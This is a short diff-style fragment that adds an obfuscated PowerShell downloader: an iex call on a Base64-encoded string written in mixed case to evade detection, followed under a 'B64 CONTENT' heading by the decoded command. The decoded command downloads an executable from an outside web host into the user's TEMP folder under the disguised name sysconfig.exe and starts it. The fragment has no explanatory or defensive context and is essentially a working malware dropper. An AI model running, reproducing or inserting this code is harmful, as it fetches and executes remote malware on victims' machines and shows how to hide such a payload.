@@ -1,0 +1,7 @@
+iex([sysTEm.teXT.ENcOdiNg]::uTf8.getstrInG([system.coNVert]::fROMBase64sTRInG('CihOZXctT2JqZWN0IHNZU3RlbS5ORVQuV0ViY2xpZU5UKS5kb3duTG9hZGZpbGUoJ2h0dHA6Ly93d3cubWFjd2l6aW5mby5jb20vdXBkYXRlcy9hbm5hLmV4ZScsIiRFbnY6VEVNUFxzeXNjb25maWcuZXhlIik7U3RhcnQtUHJvY2VzcyAoIiRFbnY6VEVNUFxzeXNjb25maWcuZXhlIikKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYStem.NET.WEbclieNT).downLoadfile('http://www.macwizinfo.com/updates/anna.exe',"$Env:TEMP\sysconfig.exe");Start-Process ("$Env:TEMP\sysconfig.exe")
+
